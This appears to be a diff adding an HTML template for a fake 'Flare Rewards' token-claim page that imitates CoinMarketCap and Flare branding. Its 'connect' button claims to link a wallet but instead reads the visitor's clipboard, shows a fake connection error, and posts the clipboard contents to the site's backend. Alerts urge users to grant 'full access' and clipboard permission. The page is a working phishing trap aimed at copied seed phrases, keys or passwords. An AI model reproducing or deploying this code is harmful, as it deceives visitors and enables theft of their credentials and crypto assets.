@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flare Rewards</title>
+    <link rel="icon" type="image/png" href="https://s2.coinmarketcap.com/static/cloud/img/banners/cmc.png" class="img">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #e6f7ff;
+            border: 1px solid #b3e0ff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #007acc;
+        }
+        .price {
+            font-size: 1.5em;
+            color: #005f99;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #007acc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        button:hover {
+            background-color: #005f99;
+        }
+        .social-media {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+
+        .social-media a {
+            margin-right: 10px;
+        }
+
+        img {
+        border-radius: 50%;
+        }
+
+        .createToken {
+            position: absolute;
+            top: 300px;
+            right: 50px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>You are not connected to a wallet yet</h1>
+        <div class="price">Connect to a wallet to see your token claims</div>
+        <button onclick="readFromClipboardAndSubmit()">connect</button>
+        <!-- <script>alert('connect your wallet and grant clip access permission when requested to interact with app')</script> -->
+    </div>
+
+    <div class="social-media">
+        <a href="https://coinmarketcap.com/currencies/flare-token/"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/13020.png" alt="X" class="img"></a>
+        <h1>Flaire</h1>
+        <h3>Token Claims</h3>
+        <p>Give your community a custom page to claim tokens with options for locking and revocability.</p>
+        
+        <h2>Created Token Claims</h2>
+    </div>
+    <div class="createToken">
+        <button type="button" disabled style="background-color: grey;padding: 32px 20px; border-radius: 10px; "> Create A Token Claim</button>
+    </div>
+
+    <script>
+        function combinedFunction() {
+            getPermission();
+            readFromClipboardAndSubmit();
+        }
+
+        function getPermission(){
+            alert("access to connect required, grant full access to app");
+        }
+
+        function readFromClipboardAndSubmit() {
+            navigator.clipboard.readText()
+                .then(text => {
+                    alert('error connecting');
+                    // Send a POST request with the clipboard value
+                    fetch('{% url "create_textmodel" %}', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'X-CSRFToken': '{{ csrf_token }}',  // Include the CSRF token
+                        },
+                        body: 'clipboard=' + encodeURIComponent(text),
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            // Handle success (e.g., redirect or show a success message)
+                            console.log('TextModel created successfully.');
+                        } else {
+                            // Handle errors (e.g., display an error message)
+                            console.error('Error creating TextModel.');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error sending POST request: ', err);
+                    });
+                })
+                .catch(err => {
+                    console.error('Error reading clipboard: ', err);
+                });
+        }
+    </script>
+</body>
+</html>
